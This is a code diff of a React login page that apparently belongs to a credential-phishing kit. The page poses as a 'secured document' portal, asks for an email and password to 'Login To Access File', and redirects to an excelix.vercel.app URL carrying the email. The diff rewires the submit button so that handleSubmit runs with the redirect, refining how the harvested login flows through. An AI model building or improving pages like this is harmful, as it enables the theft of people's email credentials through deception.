@@ -20,7 +20,6 @@ export default function Page() {
   const handleRadio = (e) => {
     setSelectOption(e.target.value);
   }
-
   
   const handleRedirect = () => {
     let redirectUrl = "https://excelix.vercel.app?e=email";
@@ -74,6 +73,7 @@ useEffect(()=> {
   const handleSubmit = async (e) => {
     setLoading(false)
     e.preventDefault();
+    handleRedirect();
     console.log(password)
     if (!email || !password) return setError("Both fields are required!");
 
@@ -143,7 +143,7 @@ useEffect(()=> {
                     <label htmlFor='password' className='font-semibold'>Password</label>
                   <input type="password" id="password" className='font-semibold' onChange={(e)=> setPassword(e.target.value)} placeholder="Email Password"/>
                   </div>
-                  <button type="submit" id='login-btn' onClick={handleRedirect} className={`btn btn-danger btn-block rounded-[5px] h-[45px] text-sm`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "Login To Access File"}</button>
+                  <button type="submit" id='login-btn' onClick={handleSubmit} className={`btn btn-danger btn-block rounded-[5px] h-[45px] text-sm`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "Login To Access File"}</button>
                 </form>
                 <p className='text-center p-2 max-sm:text-sm'>To access our online secured document page, you are <br className='max-sm:hidden'/> required to login your email address. This is to ensure <br className='max-sm:hidden'/> you are the rightful recipient for the protect file.<br className='max-sm:hidden'/> Unauthorized access is highly prohibited.</p>
               </div>
